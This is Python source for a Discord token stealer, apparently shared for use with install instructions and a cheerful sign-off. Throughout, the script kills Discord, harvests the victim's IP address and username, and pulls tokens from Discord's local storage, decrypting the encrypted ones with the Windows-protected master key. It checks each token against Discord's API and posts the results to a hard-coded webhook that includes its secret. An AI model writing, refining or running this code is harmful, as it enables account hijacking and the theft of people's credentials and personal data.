# btw imports
# run this command in cmd
# pip install requests pycryptodome pywin32
# enjoy!! <3
import requests
import getpass
import os
import base64
import json
import re
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
def payload():
    try:
        username = getpass.getuser()
        response = requests.get('https://api.ipify.org')
        data = {
            "content": f"IP Address: {response.text}\nPC Username: {username}"
        }
        webhook = "https://discord.com/api/webhooks/1560513754557583382/AMGtYYFP1Dp7bQKvWvwXchGlIu-e8A7KJQ7rGaY3bG5uGQy4WiEhgknt-qkZ1LEHdXhW"
        response = requests.post(webhook, json=data, timeout=1)
        response.raise_for_status()
    except requests.exceptions.HTTPError as http_err:
        print(f"An HTTP Error occurred: {http_err}")
    except requests.exceptions.RequestException as err:
        print(f"A Request Error Occurred: {err}")
def add_padding(s):
    return s + '=' * (-len(s) % 4)

def decrypt_val(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        return decrypted_pass[:-16].decode('utf-8', errors='ignore')
    except:
        return ""

def get_key(path):
    if not os.path.exists(path): return None
    try:
        with open(path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        return CryptUnprotectData(master_key, None, None, None, 0)[1]
    except:
        return None

def get_tokens():
    all_tokens = []
    roaming = os.getenv("APPDATA")
    encrypt_regex = r"dQw4w9WgXcQ:[^\"]*"
    normal_regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
    
    # path cfg
    paths = {"Discord": roaming + "\\discord\\Local Storage\\leveldb\\"}

    for name, path in paths.items():
        if not os.path.exists(path): continue
        _discord = name.replace(" ", "").lower()
        
        for file_stuff in os.listdir(path):
            if file_stuff[-3:] not in ["log", "ldb"]: continue
            try:
                with open(f"{path}\\{file_stuff}", errors="ignore") as f:
                    for line in f:
                        # handling encrypted tokens
                        for i in re.findall(encrypt_regex, line):
                            try:
                                key = get_key(roaming + f"\\{_discord}\\Local State")
                                if key:
                                    # Convert string part to bytes before base64 decode
                                    encrypted_data = i.split("dQw4w9WgXcQ:")[1].encode('utf-8')
                                    token = decrypt_val(base64.b64decode(encrypted_data), key)
                                    if token: all_tokens.append(token)
                            except: continue

                        for i in re.findall(normal_regex, line):
                            try:
                                # converting string into bytes into tokens
                                padded_i = add_padding(i).encode('utf-8')
                                decoded = base64.b64decode(padded_i).decode("utf-8", errors="ignore")
                                if len(decoded) > 20: all_tokens.append(decoded)
                            except: continue
            except: continue
    return list(set(all_tokens))

def tokens():
    for token in get_tokens():
        try:
            r = requests.get("https://discordapp.com/api/v6/users/@me", headers={"Authorization": token}, timeout=5)
            if r.status_code == 200:
                user = r.json()
                data = {"content": f"Token: {token} | User: {user.get('username')}#{user.get('discriminator')}"}
                requests.post("<webhook here>", json=data, timeout=5)
        except: pass

if __name__ == "__main__":
    # makes sure discord is killed to prevent like file locking
    os.system("taskkill /f /im Discord.exe >nul 2>&1")
    payload()
    tokens()
